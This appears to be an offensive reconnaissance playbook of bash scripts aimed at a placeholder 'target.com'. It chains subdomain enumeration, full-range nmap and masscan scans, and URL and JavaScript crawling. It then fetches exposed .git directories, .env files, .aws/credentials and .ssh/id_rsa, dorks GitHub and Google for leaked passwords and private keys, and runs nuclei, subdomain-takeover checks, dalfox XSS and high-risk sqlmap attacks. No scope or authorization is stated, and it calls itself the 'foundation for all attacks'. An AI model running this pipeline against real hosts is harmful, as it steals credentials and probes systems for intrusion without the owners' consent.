# DEVIL RECON MASTER v777
# The most complete recon methodology on the planet

## ══════════════════════════════════════
## PHASE 0: PASSIVE RECON
## ══════════════════════════════════════

```bash
TARGET="target.com"
OUT="/home/roxx/findings/recon-$TARGET"
mkdir -p $OUT/{subs,ips,urls,js,secrets,screenshots,ports}

# ── Subdomain Enumeration (run ALL in parallel) ─────────────────────
subfinder -d $TARGET -silent -all -recursive -o $OUT/subs/subfinder.txt &
amass enum -passive -d $TARGET -o $OUT/subs/amass.txt 2>/dev/null &
assetfinder --subs-only $TARGET > $OUT/subs/assetfinder.txt 2>/dev/null &
findomain -t $TARGET -q > $OUT/subs/findomain.txt 2>/dev/null &

# Certificate transparency
curl -s "https://crt.sh/?q=%.$TARGET&output=json" | \
  python3 -c "import json,sys; [print(x['name_value']) for x in json.load(sys.stdin)]" 2>/dev/null | \
  tr ',' '\n' | sed 's/\*\.//' | sort -u > $OUT/subs/crtsh.txt &

# Google dorking via API
curl -s "https://www.google.com/search?q=site:$TARGET&num=100" | \
  grep -oE '[a-zA-Z0-9._-]+\.'$TARGET | sort -u > $OUT/subs/google.txt &

# Shodan (requires API key)
SHODAN_KEY="${SHODAN_API_KEY:-}"
[[ -n "$SHODAN_KEY" ]] && \
  curl -s "https://api.shodan.io/dns/domain/$TARGET?key=$SHODAN_KEY" | \
  python3 -c "import json,sys; [print(x['subdomain']+'.'"$TARGET"') for x in json.load(sys.stdin).get('data',[])]" \
  > $OUT/subs/shodan.txt &

# VirusTotal
VT_KEY="${VT_API_KEY:-}"
[[ -n "$VT_KEY" ]] && \
  curl -s "https://www.virustotal.com/api/v3/domains/$TARGET/subdomains?limit=40" \
  -H "x-apikey: $VT_KEY" | \
  python3 -c "import json,sys; [print(x['id']) for x in json.load(sys.stdin).get('data',[])]" \
  > $OUT/subs/virustotal.txt &

wait

# Merge all subs
cat $OUT/subs/*.txt | sort -u | grep -E "^[a-zA-Z0-9._-]+\.$TARGET$" > $OUT/subs/ALL.txt
echo "[*] Total subs found: $(wc -l < $OUT/subs/ALL.txt)"
```

## ══════════════════════════════════════
## PHASE 1: ACTIVE RECON
## ══════════════════════════════════════

```bash
# ── HTTP Probing ──────────────────────────────────────────────────────
httpx -l $OUT/subs/ALL.txt \
  -ports 80,443,8080,8443,8888,3000,4000,5000,8000,9000,9090 \
  -title -tech-detect -status-code -follow-redirects \
  -threads 100 -timeout 10 \
  -o $OUT/httpx_live.txt 2>/dev/null

# Extract live HTTP hosts
grep "\[200\]\|\[301\]\|\[302\]\|\[401\]\|\[403\]" $OUT/httpx_live.txt | \
  awk '{print $1}' > $OUT/live_hosts.txt

echo "[*] Live hosts: $(wc -l < $OUT/live_hosts.txt)"

# ── Port Scanning ─────────────────────────────────────────────────────
# First: fast port discovery
nmap -iL $OUT/live_hosts.txt --open -p- -T4 --min-rate 5000 \
  -oN $OUT/ports/nmap_full.txt 2>/dev/null &

# Masscan for speed on IP list
cat $OUT/subs/ALL.txt | dnsx -silent -a -resp | awk '{print $NF}' | sort -u > $OUT/ips/all_ips.txt
masscan -iL $OUT/ips/all_ips.txt -p0-65535 --rate=10000 \
  -oG $OUT/ports/masscan.txt 2>/dev/null &

# Service detection on found ports
nmap -iL $OUT/live_hosts.txt -sV -sC -p80,443,8080,8443,22,21,25,587,3306,5432,6379,27017 \
  -oN $OUT/ports/services.txt 2>/dev/null &

wait
```

## ══════════════════════════════════════
## PHASE 2: URL & JS DISCOVERY
## ══════════════════════════════════════

```bash
# ── URL Collection ────────────────────────────────────────────────────
cat $OUT/live_hosts.txt | waybackurls > $OUT/urls/wayback.txt 2>/dev/null &
cat $OUT/live_hosts.txt | gau --threads 5 > $OUT/urls/gau.txt 2>/dev/null &

# Deep crawl with katana
katana -list $OUT/live_hosts.txt \
  -depth 5 -jc -aff \
  -concurrency 50 \
  -o $OUT/urls/katana.txt 2>/dev/null &

wait

# Merge all URLs
cat $OUT/urls/*.txt | sort -u > $OUT/urls/ALL.txt
echo "[*] Total URLs: $(wc -l < $OUT/urls/ALL.txt)"

# ── Parameter Discovery ───────────────────────────────────────────────
grep "?" $OUT/urls/ALL.txt | sort -u > $OUT/urls/params.txt
# Extract unique params
cat $OUT/urls/params.txt | unfurl keys 2>/dev/null | sort -u > $OUT/urls/param_names.txt

# ── JS File Analysis ──────────────────────────────────────────────────
grep "\.js$\|\.js?" $OUT/urls/ALL.txt | sort -u > $OUT/js/js_urls.txt

# Download and analyze JS files
cat $OUT/js/js_urls.txt | while read url; do
  curl -sL "$url" --max-time 10 2>/dev/null
done > $OUT/js/all_js.txt

# Extract secrets from JS
grep -oE '(api[_-]?key|secret|password|token|apikey)["\s]*[:=]["\s]*[a-zA-Z0-9_-]{10,}' \
  $OUT/js/all_js.txt | sort -u > $OUT/secrets/js_secrets.txt

# Extract endpoints from JS
grep -oE '/(api|v[0-9]+|rest|graphql)/[a-zA-Z0-9/_-]+' $OUT/js/all_js.txt | sort -u \
  > $OUT/js/js_endpoints.txt

# truffleHog / gitleaks on JS
trufflehog filesystem --directory="$OUT/js/" --json 2>/dev/null > $OUT/secrets/trufflehog.json || true
```

## ══════════════════════════════════════
## PHASE 3: SECRET DISCOVERY
## ══════════════════════════════════════

```bash
# ── Git Repository Exposure ───────────────────────────────────────────
cat $OUT/live_hosts.txt | while read host; do
  # Check exposed .git
  code=$(curl -so /dev/null -w "%{http_code}" "$host/.git/HEAD" --max-time 5)
  [[ "$code" == "200" ]] && {
    echo "EXPOSED GIT: $host" | tee -a $OUT/secrets/git_exposed.txt
    # Dump it
    mkdir -p $OUT/secrets/git-$host
    git clone "$host/.git" $OUT/secrets/git-$host 2>/dev/null || \
    git-dumper "$host/.git" $OUT/secrets/git-$host 2>/dev/null || true
  }
  
  # Check .env
  code=$(curl -so /dev/null -w "%{http_code}" "$host/.env" --max-time 5)
  [[ "$code" == "200" ]] && curl -s "$host/.env" | tee -a $OUT/secrets/dotenv.txt
  
  # Common secret paths
  for path in .env .env.local .env.prod config.json secrets.json \
              config/database.yml config/secrets.yml wp-config.php \
              .aws/credentials .ssh/id_rsa phpinfo.php; do
    code=$(curl -so /dev/null -w "%{http_code}" "$host/$path" --max-time 3)
    [[ "$code" == "200" ]] && echo "$host/$path" | tee -a $OUT/secrets/exposed_files.txt
  done
done

# ── GitHub Dorking ────────────────────────────────────────────────────
# Search GitHub for leaked secrets
GH_DORKS=(
  "\"$TARGET\" password"
  "\"$TARGET\" api_key"
  "\"$TARGET\" secret"
  "\"$TARGET\" credentials"
  "\"$TARGET\" db_password"
  "\"$TARGET\" access_token"
  "filename:.env $TARGET"
  "filename:config.json $TARGET"
  "org:$COMPANY api_key"
)

for dork in "${GH_DORKS[@]}"; do
  echo "DORK: $dork"
  curl -s "https://api.github.com/search/code?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$dork'))")" \
    -H "Authorization: token $GITHUB_TOKEN" 2>/dev/null | \
    python3 -c "import json,sys; [print(x.get('html_url','')) for x in json.load(sys.stdin).get('items',[])]"
done
```

## ══════════════════════════════════════
## PHASE 4: VULNERABILITY SCAN
## ══════════════════════════════════════

```bash
# ── Nuclei — Full Template Run ────────────────────────────────────────
nuclei -l $OUT/live_hosts.txt \
  -t ~/nuclei-templates/ \
  -severity critical,high \
  -rate-limit 100 \
  -bulk-size 25 \
  -concurrency 25 \
  -o $OUT/nuclei_critical.txt \
  -silent 2>/dev/null

# Specific template categories
nuclei -l $OUT/live_hosts.txt -t ~/nuclei-templates/http/exposures/ -silent -o $OUT/nuclei_exposures.txt &
nuclei -l $OUT/live_hosts.txt -t ~/nuclei-templates/http/takeovers/ -silent -o $OUT/nuclei_takeovers.txt &
nuclei -l $OUT/live_hosts.txt -t ~/nuclei-templates/http/cves/ -severity critical,high -silent -o $OUT/nuclei_cves.txt &
wait

# ── Subdomain Takeover ────────────────────────────────────────────────
subzy run --targets $OUT/subs/ALL.txt --concurrency 100 --hide-fails \
  > $OUT/takeovers.txt 2>/dev/null &
subjack -w $OUT/subs/ALL.txt -t 100 -o $OUT/subjack.txt -ssl 2>/dev/null &
wait

# ── XSS Scan ─────────────────────────────────────────────────────────
cat $OUT/urls/params.txt | dalfox pipe --skip-bav -o $OUT/xss.txt 2>/dev/null &

# ── SQLi Scan ─────────────────────────────────────────────────────────
cat $OUT/urls/params.txt | head -100 | while read url; do
  sqlmap -u "$url" --batch --level=3 --risk=3 --threads=10 \
    --output-dir=$OUT/sqli --forms 2>/dev/null &
done
wait
```

## ══════════════════════════════════════
## GOOGLE DORKS ARSENAL (100+)
## ══════════════════════════════════════

```bash
TARGET="target.com"

DORKS=(
  # Exposed sensitive files
  "site:$TARGET ext:env OR ext:log OR ext:bak OR ext:backup OR ext:sql OR ext:conf"
  "site:$TARGET inurl:admin OR inurl:dashboard OR inurl:panel OR inurl:login"
  "site:$TARGET inurl:api OR inurl:graphql OR inurl:swagger OR inurl:openapi"
  "site:$TARGET inurl:config OR inurl:setup OR inurl:install"
  "site:$TARGET filetype:pdf OR filetype:xlsx OR filetype:docx confidential"
  "site:$TARGET intext:password OR intext:passwd OR intext:secret"
  "site:$TARGET intext:\"api_key\" OR intext:\"access_token\" OR intext:\"aws_secret\""
  "site:$TARGET inurl:.git OR inurl:.svn OR inurl:.DS_Store"
  
  # GitHub leaks
  "\"$TARGET\" filename:.env"
  "\"$TARGET\" filename:config.json password"
  "\"$TARGET\" api_key OR apikey OR api-key"
  "\"$TARGET\" secret_key OR secretkey OR secret-key"
  "\"$TARGET\" db_password OR database_password OR mysql_password"
  "\"$TARGET\" access_token OR oauth_token"
  "\"$TARGET\" BEGIN RSA PRIVATE KEY"
  "\"$TARGET\" filename:*.pem OR filename:*.key OR filename:*.p12"
  
  # Subdomains via Google
  "site:*.$TARGET -www"
  "site:dev.$TARGET OR site:staging.$TARGET OR site:test.$TARGET OR site:api.$TARGET"
  "site:admin.$TARGET OR site:internal.$TARGET OR site:vpn.$TARGET"
  
  # Pastebin leaks
  "site:pastebin.com $TARGET"
  "site:gist.github.com $TARGET password"
  "site:hastebin.com $TARGET"
  
  # Error pages (debug info)
  "site:$TARGET \"mysql_error\" OR \"sql syntax\" OR \"ORA-\" OR \"pg_query\""
  "site:$TARGET \"stack trace\" OR \"exception\" OR \"debug\" OR \"traceback\""
  "site:$TARGET intext:\"index of\" backup"
  
  # Cloud storage
  "site:s3.amazonaws.com $TARGET"
  "site:blob.core.windows.net $TARGET"
  "site:storage.googleapis.com $TARGET"
)

for dork in "${DORKS[@]}"; do
  echo "=== DORK: $dork ==="
  # Open in browser or use googler CLI
  googler -n 10 -N "$dork" 2>/dev/null | head -20 || true
done
```

**IMPACT: Foundation for all attacks | Maximizes attack surface discovery**
